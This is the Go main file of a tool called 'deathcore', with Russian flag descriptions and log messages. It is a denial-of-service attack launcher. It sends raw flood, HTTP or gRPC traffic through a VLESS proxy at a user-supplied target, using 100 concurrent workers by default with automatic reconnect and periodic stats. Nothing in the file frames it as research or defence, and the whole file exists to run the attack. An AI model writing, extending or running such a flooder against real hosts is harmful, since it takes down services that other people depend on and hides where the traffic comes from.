package main
import (
        "context"
        "flag"
        "fmt"
        "log"
        "os"
        "os/signal"
        "strings"
        "syscall"
        "time"
        "net"
        "deathcore/config"
        "deathcore/core"
        "deathcore/vless"
        "deathcore/worker"
)
func main() {
        var (
                vlessURL        = flag.String("vless", "", "VLESS-ссылка")
                workers         = flag.Int("workers", 100, "Количество одновременных соединений")
                attackMode      = flag.String("mode", "flood", "Режим атаки: flood, http, grpc")
                httpTemplate    = flag.String("http-template", "GET /{{.Path}} HTTP/1.1\r\nHost: {{.Host}}\r\nConnection: keep-alive\r\n\r\n", "Шаблон HTTP-запроса")
                grpcMsgFile     = flag.String("grpc-message-file", "", "Файл с бинарным gRPC-сообщением")
                reconnectDelay  = flag.Duration("reconnect-delay", 1*time.Second, "Задержка переподключения (0 = мгновенный реконнект)")
                maxBackoff      = flag.Duration("max-backoff", 30*time.Second, "Максимальный backoff (0 = отключить)")
                readTimeout     = flag.Duration("read-timeout", 0, "Таймаут чтения")
                target          = flag.String("target", "", "Целевой хост:порт (обязателен)")
        )
        flag.Parse()
        if *vlessURL == "" {
                fmt.Fprintln(os.Stderr, "Укажите -vless URL")
                os.Exit(1)
        }
        if *target == "" {
                fmt.Fprintln(os.Stderr, "Укажите -target (например, example.com:443)")
                os.Exit(1)
        }
        outbound, err := vless.Parse(*vlessURL)
        if err != nil {
                log.Fatalf("Ошибка парсинга VLESS: %v", err)
        }
        dialer, err := core.NewDialer(outbound)
        if err != nil {
                log.Fatalf("Ошибка создания dialer: %v", err)
        }
        defer dialer.Close()
        host, _, _ := parseHostPort(*target)
        path := "/"
        var gen core.PayloadGenerator
        switch strings.ToLower(*attackMode) {
        case "flood":
                gen = core.NewFloodGenerator(65536)
        case "http":
                gen = core.NewHTTPGenerator(*httpTemplate, host, path)
        case "grpc":
                if *grpcMsgFile == "" {
                        log.Fatal("Для gRPC-атаки укажите -grpc-message-file")
                }
                gen, err = core.NewGRPCGenerator(*grpcMsgFile)
                if err != nil {
                        log.Fatalf("Ошибка загрузки gRPC-сообщения: %v", err)
                }
        default:
                log.Fatalf("Неизвестный режим атаки: %s", *attackMode)
        }
        cfg := &config.Config{
                VLESSURL:        *vlessURL,
                Workers:         *workers,
                AttackMode:      *attackMode,
                HTTPTemplate:    *httpTemplate,
                GRPCMessageFile: *grpcMsgFile,
                ReconnectDelay:  *reconnectDelay,
                MaxBackoff:      *maxBackoff,
                ReadTimeout:     *readTimeout,
                TargetAddr:      *target,
        }
        ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
        defer cancel()
        log.Printf("🚀 deathcore запущен | workers: %d | mode: %s | target: %s", cfg.Workers, cfg.AttackMode, cfg.TargetAddr)
        // Запускаем воркеры
        for i := 0; i < cfg.Workers; i++ {
                go worker.Run(ctx, i, cfg, dialer, gen)
        }
        // Периодический вывод статистики
        go func() {
                ticker := time.NewTicker(3 * time.Second)
                defer ticker.Stop()
                for {
                        select {
                        case <-ctx.Done():
                                return
                        case <-ticker.C:
                                log.Println(worker.Stats())
                        }
                }
        }()
        <-ctx.Done()
        log.Println("⏸️ Завершение работы...")
        time.Sleep(2 * time.Second)
        log.Println("✅  deathcore остановлен")
}
func parseHostPort(addr string) (string, string, error) {
        host, port, err := net.SplitHostPort(addr)
        return host, port, err
}
